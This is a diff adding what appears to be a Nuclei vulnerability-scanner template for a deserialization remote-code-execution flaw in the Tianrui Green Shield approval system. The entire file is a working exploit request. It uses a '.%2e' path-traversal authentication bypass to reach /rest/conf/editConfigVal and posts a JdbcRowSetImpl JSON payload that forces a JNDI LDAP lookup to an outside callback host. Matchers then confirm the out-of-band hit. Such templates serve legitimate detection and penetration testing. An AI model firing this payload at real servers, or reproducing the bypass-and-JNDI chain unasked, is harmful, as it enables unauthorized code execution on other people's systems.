@@ -1,0 +1,35 @@
+id: tianrui-editConfigVal-rce
+
+info:
+  name: 天锐绿盾审批系统 editConfigVal 存在反序列化漏洞
+  author: tianrui
+  severity: high
+  tags: tianrui
+
+variables:
+  payload_jndi_ldap: "ldap://{{interactsh-url}}/xxx"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+
+        {
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "{{payload_jndi_ldap}}",
+            "autoCommit": true
+        }
+
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
+          - "status_code == 200"
+          - 'len(body) < 10'
+          - 'contains(body, "false")'
+        condition: and
+
